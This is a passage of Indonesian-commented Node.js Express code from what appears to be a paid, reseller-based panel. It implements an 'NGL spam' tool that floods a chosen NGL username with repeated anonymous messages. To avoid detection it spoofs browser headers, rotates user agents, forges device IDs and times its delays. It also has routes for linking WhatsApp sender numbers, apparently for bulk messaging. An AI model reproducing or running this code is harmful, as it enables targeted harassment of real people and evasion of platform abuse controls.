  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },
  
  // Cek apakah target sudah melebihi limit harian
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },
  
  // Update counter setelah berhasil kirim
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },
  
  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },
  
  // Lihat statistik user
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },
  
  // Lihat statistik target
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

// Auto-reset setiap 24 jam (midnight)
setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000); // Cek tiap 1 menit

// ============================================
// FUNGSI NGL SPAM - UPDATED
// ============================================
async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    // Enhanced form data dengan field tambahan
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateEnhancedUUID());
    formData.append('gameSlug', '');
    formData.append('referrer', '');
    formData.append('timestamp', Date.now().toString());

    // Random delay yang lebih realistis
    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2-6 detik
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    // Enhanced user agents
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    ];
    
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 Attempt ${attempt} to ${target}`);
      
      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        },
        timeout: 15000,
        validateStatus: function (status) {
          return status >= 200 && status < 500; // Terima semua status kecuali server errors
        }
      });

      console.log(`🔍 Response status: ${response.status}, data:`, response.data);

      // Enhanced response handling
      if (response.status === 200) {
        if (response.data && response.data.success !== false) {
          success++;
          logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
          return true;
        } else {
          errors++;
          logs.push(`[${attempt}/${count}] ⚠️ Response tidak valid: ${JSON.stringify(response.data)}`);
          return false;
        }
      } else if (response.status === 429) {
        errors++;
        logs.push(`[${attempt}/${count}] 🚫 Rate limited - tunggu beberapa saat`);
        // Tunggu lebih lama jika rate limited
        await new Promise(resolve => setTimeout(resolve, 10000));
        return false;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ HTTP ${response.status}: ${response.statusText}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 Error in attempt ${attempt}:`, error.message);
      
      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }
      
      return false;
    }
  };

  // Enhanced UUID generator
  function generateEnhancedUUID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 9);
    return `web-${timestamp}-${random}`;
  }

  // Validasi input
  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 50) { // Kurangi limit untuk menghindari detection
    throw new Error('Maksimal 50 pesan per request untuk menghindari detection');
  }

  // Jalankan spam
  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 2-6 detik random antar pesan`);
  logs.push(`─`.repeat(40));

  for (let i = 0; i < count; i++) {
    const result = await sendNGLMessage(target, message, i + 1);
    
    // Jika rate limited, berhenti sementara
    if (i > 0 && i % 10 === 0) {
      logs.push(`⏸️  Istirahat sebentar setelah ${i} pesan...`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  logs.push(`─`.repeat(40));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

// Helper function untuk generate UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================
// ROUTE NGL SPAM WEB - UPDATED dengan Info Limit
// ============================================

// ==================== NGL SPAM ROUTE ==================== //
app.get("/ngl-spam", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  const formattedExp = currentUser ? new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  }) : "-";

  const userId = req.ip || req.headers['x-forwarded-for'] || username;
  const userUsageToday = userTracking.getUserStats(userId);
  const remainingUser = 200 - userUsageToday;
  const usagePercentage = (userUsageToday / 200) * 100;

  // Load template dari file terpisah
  const filePath = path.join(__dirname, "INDICTIVE", "spam-ngl.html");
  
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file spam-ngl.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }

    // Replace variables dengan data REAL dari sistem
    let finalHtml = html
      .replace(/\${username}/g, username)
      .replace(/\${formattedExp}/g, formattedExp)
      .replace(/\${userUsageToday}/g, userUsageToday)
      .replace(/\${remainingUser}/g, remainingUser)
      .replace(/\${usagePercentage}/g, usagePercentage);
    
    res.send(finalHtml);
  });
});

// ============================================
// API ENDPOINT - UPDATED dengan Tracking System
// ============================================
app.get("/api/ngl-stats", requireAuth, (req, res) => {
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  res.json({
    userStats: {
      todayUsage: userTracking.getUserStats(userId),
      dailyLimit: 200,
      remaining: 200 - userTracking.getUserStats(userId)
    },
    resetTime: 'Midnight (00:00 WIB)',
    message: 'Statistik penggunaan hari ini'
  });
});

// ✨ BONUS: Endpoint untuk cek target
app.get("/api/ngl-target-stats/:target", requireAuth, (req, res) => {
  const { target } = req.params;
  
  res.json({
    target: target,
    todayReceived: userTracking.getTargetStats(target),
    dailyLimit: 100,
    remaining: 100 - userTracking.getTargetStats(target),
    resetTime: 'Midnight (00:00 WIB)'
  });
});

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;
  
  // Ambil user ID dari IP atau cookie
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  // Hard limits
  const limits = {
    maxPerRequest: 100,      // Max 100 pesan per request
    minDelay: 3000,          // Minimal delay 3 detik
    maxDailyPerUser: 200,    // Max 200 pesan per user per hari
    maxDailyPerTarget: 100   // Max 100 pesan ke target yang sama
  };
  
  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  // ✅ VALIDASI 1: Cek count tidak melebihi maxPerRequest
  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  // ✅ VALIDASI 2: Cek limit harian user
  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  // ✅ VALIDASI 3: Cek limit harian target
  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    // Kirim pesan
    const result = await nglSpam(target, message, parseInt(count));
    
    // ✅ UPDATE TRACKING setelah berhasil
    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);
    
    // Kirim response dengan statistik
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
//untuk chat gpt
app.get("/CHATGPT", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "CHATGPT.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
// Route untuk TikTok (HANYA bisa diakses setelah login)
app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// Route untuk halaman My Senders
app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});

// API untuk mendapatkan daftar sender user
app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

// API untuk menambah sender baru
/*app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  // Validasi nomor
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('62')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }
  
  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    // Langsung jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
        // Simpan socket ke map jika diperlukan
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});*/

app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  let { number } = req.body;

  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }

  // Bersihkan karakter selain angka
  let cleanNumber = number.replace(/\D/g, '');

  // Validasi panjang nomor internasional
  // WhatsApp standar: 8 – 15 digit
  if (cleanNumber.length < 8 || cleanNumber.length > 15) {
    return res.json({
      success: false,
      error: "Nomor tidak valid (harus format internasional)"
    });
  }

  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);

    // Jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then(() => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected`);
      })
      .catch((err) => {
        console.error(
          `[${username}] ❌ Sender ${cleanNumber} gagal connect:`,
          err.message
        );
      });

    res.json({
      success: true,
      message: "Proses koneksi dimulai",
      number: cleanNumber,
      note: "Kode pairing akan muncul dalam beberapa detik"
    });

  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({
      success: false,
      error: "Terjadi kesalahan: " + error.message
    });
  }
});

// API untuk menghapus sender
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    // Hapus folder session
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ============= User Add ================== \\
// GANTI kode route /adduser yang ada dengan yang ini:
app.post("/adduser", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      return res.redirect("/login?msg=User tidak ditemukan");
    }

    const sessionRole = currentUser.role || 'user';
    const { username: newUsername, password, role, durasi } = req.body;

    // Validasi input lengkap
    if (!newUsername || !password || !role || !durasi) {
      return res.send(`
        <script>
          alert("❌ Lengkapi semua kolom.");
          window.history.back();
        </script>
      `);
    }

    // Validasi durasi
    const durasiNumber = parseInt(durasi);
    if (isNaN(durasiNumber) || durasiNumber <= 0) {
      return res.send(`
        <script>
          alert("❌ Durasi harus angka positif.");
          window.history.back();
        </script>
      `);
    }

    // Cek hak akses berdasarkan role pembuat
    if (sessionRole === "user") {
      return res.send(`
        <script>
          alert("🚫 User tidak bisa membuat akun.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role !== "user") {
      return res.send(`
        <script>
          alert("🚫 Reseller hanya boleh membuat user biasa.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "admin") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat admin lain.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Reseller tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    // Cek username sudah ada
    if (users.some(u => u.username === newUsername)) {
      return res.send(`
        <script>
          alert("❌ Username '${newUsername}' sudah terdaftar.");
          window.history.back();
        </script>
      `);
    }

    // Validasi panjang username dan password
    if (newUsername.length < 3) {
      return res.send(`
        <script>
          alert("❌ Username minimal 3 karakter.");
          window.history.back();
        </script>
      `);
    }

    if (password.length < 4) {
      return res.send(`
        <script>
          alert("❌ Password minimal 4 karakter.");
          window.history.back();
        </script>
      `);
    }

    const expired = Date.now() + (durasiNumber * 86400000);

    // Buat user baru
    const newUser = {
      username: newUsername,
      key: password,
      expired,
      role,
      telegram_id: "",
      isLoggedIn: false
    };

    users.push(newUser);
    
    // Simpan dan cek hasilnya
    const saveResult = saveUsers(users);
    
    if (!saveResult) {
      throw new Error("Gagal menyimpan data user ke file system");
    }

    // Redirect ke userlist dengan pesan sukses
    return res.redirect("/userlist?msg=User " + newUsername + " berhasil dibuat");

  } catch (error) {
    console.error("❌ Error in /adduser:", error);
    return res.send(`
      <script>
        alert("❌ Terjadi error saat menambahkan user: ${error.message}");
        window.history.back();
      </script>
    `);
  }
});

// TAMBAHKAN route ini SEBELUM route POST /adduser
app.get("/adduser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa menambah user.");
  }

  // Tentukan opsi role berdasarkan role current user
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
      <option value="admin">Admin</option>
      <option value="owner">Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
    `;
  } else {
    // Reseller hanya bisa buat user biasa
    roleOptions = `<option value="user">User</option>`;
  }

  const html = `
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tambah User - PIKACHU</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      body {
        font-family: 'Poppins', sans-serif;
        background: #000000;
        color: #F0F0F0;
        min-height: 100vh;
        padding: 20px;
        position: relative;
        overflow-y: auto; 
        overflow-x: hidden;
      }

      #particles {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 0;
      }

      .content {
        position: relative;
        z-index: 2;
        max-width: 500px;
        margin: 0 auto;
      }

      .header {
        text-align: center;
        margin-bottom: 30px;
        padding: 20px;
      }

      .header h2 {
        color: #F0F0F0;
        font-size: 24px;
        font-family: 'Orbitron', sans-serif;
        text-transform: uppercase;
        letter-spacing: 2px;
        margin-bottom: 10px;
        text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
      }

      .header p {
        color: #A0A0A0;
        font-size: 14px;
      }

      .form-container {
        background: rgba(26, 26, 26, 0.9);
        border: 1px solid #333333;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        margin-bottom: 20px;
      }

      .user-info {
        background: rgba(51, 51, 51, 0.6);
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 20px;
        border-left: 4px solid #4ECDC4;
      }

      .info-row {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
        font-size: 13px;
      }

      .info-label {
        color: #A0A0A0;
        font-weight: 600;
      }

      .info-value {
        color: #F0F0F0;
        font-weight: 500;
      }

      .role-badge {
        display: inline-block;
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 11px;
        font-weight: bold;
        text-transform: uppercase;
      }

      .role-owner {
        background: linear-gradient(135deg, #FFD700, #FFA500);
        color: #000;
      }

      .role-admin {
        background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
        color: #fff;
      }

      .role-reseller {
        background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
        color: #000;
      }

      .role-user {
        background: linear-gradient(135deg, #95E1D3, #B5EAD7);
        color: #000;
      }

      .form-group {
        margin-bottom: 20px;
      }

      label {
        display: block;
        margin-bottom: 8px;
        font-weight: 600;
        color: #F0F0F0;
        font-family: 'Poppins', sans-serif;
        font-size: 13px;
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      input, select {
        width: 100%;
        padding: 14px;
        border-radius: 8px;
        border: 1px solid #333333;
        background: rgba(38, 38, 38, 0.8);
        color: #F0F0F0;
        box-sizing: border-box;
        font-size: 14px;
        transition: all 0.3s ease;
      }

      input:focus, select:focus {
        outline: none;
        border-color: #F0F0F0;
        box-shadow: 0 0 10px rgba(240, 240, 240, 0.3);
      }

      .permission-info {
        background: rgba(51, 51, 51, 0.6);
        padding: 12px;
        border-radius: 6px;
        font-size: 11px;
        color: #A0A0A0;
        text-align: center;
        margin-top: 15px;
        border: 1px dashed #333333;
      }

      .warning-text {
        color: #FF6B6B;
        font-weight: bold;
      }

      .button-group {
        display: flex;
        gap: 15px;
        margin-top: 25px;
      }

      .btn {
        flex: 1;
        padding: 14px;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
        font-family: 'Orbitron', sans-serif;
        font-size: 13px;
        text-transform: uppercase;
        letter-spacing: 1px;
        text-align: center;
        text-decoration: none;
      }

      .btn-save {
        background: rgba(240, 240, 240, 0.9);
        color: #000;
      }

      .btn-save:hover {
        background: #F0F0F0;
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(240, 240, 240, 0.3);
      }

      .btn-back {
        background: rgba(51, 51, 51, 0.8);
        color: #F0F0F0;
        border: 1px solid #333333;
      }

      .btn-back:hover {
        background: rgba(240, 240, 240, 0.1);
        border-color: #F0F0F0;
        transform: translateY(-2px);
      }

      .permission-note {
        background: rgba(51, 51, 51, 0.6);
        padding: 12px;
        border-radius: 6px;
        font-size: 11px;
        color: #A0A0A0;
        text-align: center;
        margin-top: 15px;
        border-left: 3px solid #4ECDC4;
      }

      @media (max-width: 500px) {
        body {
          padding: 16px;
        }

        .content {
          max-width: 100%;
        }

        .form-container {
          padding: 20px;
        }

        .button-group {
          flex-direction: column;
        }

        .header h2 {
          font-size: 20px;
        }
      }

      /* Animasi */
      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(20px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .form-container {
        animation: fadeIn 0.6s ease-out;
      }
    </style>
  </head>
  <body>
    <!-- Efek Partikel -->
    <div id="particles"></div>

    <div class="content">
      <div class="header">
        <h2><i class="fas fa-user-plus"></i> TAMBAH USER BARU</h2>
        <p>Buat akun user baru dengan role yang sesuai</p>
      </div>

      <div class="form-container">
        <!-- Current User Information -->
        <div class="user-info">
          <div class="info-row">
            <span class="info-label">Anda Login Sebagai:</span>
            <span class="info-value">${username}</span>
          </div>
          <div class="info-row">
            <span class="info-label">Role Anda:</span>
            <span class="info-value">
              <span class="role-badge role-${role}">
                ${role.charAt(0).toUpperCase() + role.slice(1)}
              </span>
            </span>
          </div>
        </div>

        <form method="POST" action="/adduser">
          <div class="form-group">
            <label for="username"><i class="fas fa-user"></i> Username</label>
            <input type="text" id="username" name="username" placeholder="Masukkan username" required>
          </div>

          <div class="form-group">
            <label for="password"><i class="fas fa-key"></i> Password / Key</label>
            <input type="text" id="password" name="password" placeholder="Masukkan password" required>
          </div>

          <div class="form-group">
            <label for="role"><i class="fas fa-shield-alt"></i> Role</label>
            <select id="role" name="role" required>
              ${roleOptions}
            </select>
          </div>

          <div class="form-group">
            <label for="durasi"><i class="fas fa-calendar-plus"></i> Durasi (Hari)</label>
            <input type="number" id="durasi" name="durasi" min="1" max="365" placeholder="30" value="30" required>
          </div>

          <div class="permission-info">
            <i class="fas fa-info-circle"></i> 
            <strong>Info Hak Akses:</strong> 
            ${role === 'reseller' ? 'Reseller hanya bisa membuat User biasa' : 
              role === 'admin' ? 'Admin bisa membuat User dan Reseller' : 
              'Owner bisa membuat semua role'}
          </div>

          <div class="button-group">
            <button type="submit" class="btn btn-save">
              <i class="fas fa-save"></i> BUAT USER
            </button>
            
            <a href="/userlist" class="btn btn-back">
              <i class="fas fa-arrow-left"></i> BATAL
            </a>
          </div>
        </form>
            
        <div class="permission-note">
          <i class="fas fa-exclamation-triangle"></i>
          Pastikan data yang dimasukkan sudah benar. User yang dibuat tidak bisa dihapus oleh pembuatnya.
        </div>
      </div>
    </div>

    <!-- JS Partikel -->
    <script>
      $(document).ready(function() {
        $('#particles').particleground({
          dotColor: '#333333',
          lineColor: '#555555',
          minSpeedX: 0.1,
          maxSpeedX: 0.3,
          minSpeedY: 0.1,
          maxSpeedY: 0.3,
          density: 8000,
          particleRadius: 2,
          curvedLines: false,
          proximity: 100
        });

        // Update role badge preview
        document.getElementById('role').addEventListener('change', function() {
          const selectedRole = this.value;
          const badge = document.querySelector('.role-badge');
          if (badge) {
            badge.className = \`role-badge role-\${selectedRole}\`;
            badge.textContent = selectedRole.charAt(0).toUpperCase() + selectedRole.slice(1);
          }
        });
      });
    </script>
  </body>
  </html>
  `;
  res.send(html);
});

app.post("/hapususer", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { username: targetUsername } = req.body;

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒

  // 1. Tidak bisa hapus diri sendiri
  if (sessionUsername === targetUsername) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // 2. Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh hapus user biasa.");
  }

  // 3. Admin tidak boleh hapus admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa hapus admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa hapus owner.");
    }
  }

  // 4. Owner bisa hapus semua kecuali diri sendiri

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== targetUsername);
  saveUsers(filtered);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + targetUsername + " berhasil dihapus");
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
